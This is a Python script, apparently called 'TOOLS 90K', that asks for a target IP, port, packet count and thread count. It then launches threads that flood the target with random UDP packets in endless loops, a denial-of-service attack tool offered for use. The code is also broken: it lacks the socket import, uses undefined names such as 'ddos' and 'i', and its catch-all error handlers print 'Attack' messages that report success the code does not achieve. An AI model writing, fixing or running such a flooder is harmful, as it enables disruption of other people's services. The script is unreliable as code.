import random
import os,sys
import threading
import time

os.system("clear")
print("TOOLS 90K")
ip = str(input("IP HOST »»»»»» "))
port = int(input("PORT HOST »»»»»» "))
choice = str(input("ATTACK (yes/no)  »»»»»» "))
times = int(input("PAKET  »»»»»» "))
threads = int(input("PLER »»»»»» "))
os.system("clear")
def pler():
  data = random._urandom(1025)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(ddos,addr)
        print(i +"\033[91m [Relaxs] Attack %s:%s"%(ip,port))
    except:
          print("\033[91m [Relaxs] Attack %s:%s"%(ip,port))
  
def potong():
  data = random._urandom(1024)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.sendto(ddos)
        print(i +"\033[91m [Relaxs] Attack %s:%s"%(ip,port))
    except:
      print("\033[91m [Relaxs] Attack %s:%s"%(ip,port))

def memek():
  data = random._urandom(1023)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.sendto(data)
        print(i +"\033[91m [Relaxs] Attack %s:%s"%(ip,port))
    except:
      print("\033[91m [Relaxs] Attack %s:%s"%(ip,port))

def jadah():
  data = random._urandom(1022)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.sendto(data)
        print(i +"\033[91m [Relaxs] Attack %s:%s"%(ip,port))
    except:
      print("\033[91m [Relaxs] Attack %s:%s"%(ip,port))
 
for y in range(threads):
  if choice == "yes":
    th = threading.Thread(target = pler)
    th.start()
  else:
    th = threading.Thread(target = potong)
    th.start()
    th = threading.Thread(target = memek)
    th.start()
    th = threading.Thread(target = jadah)
    th.start()￼Enter
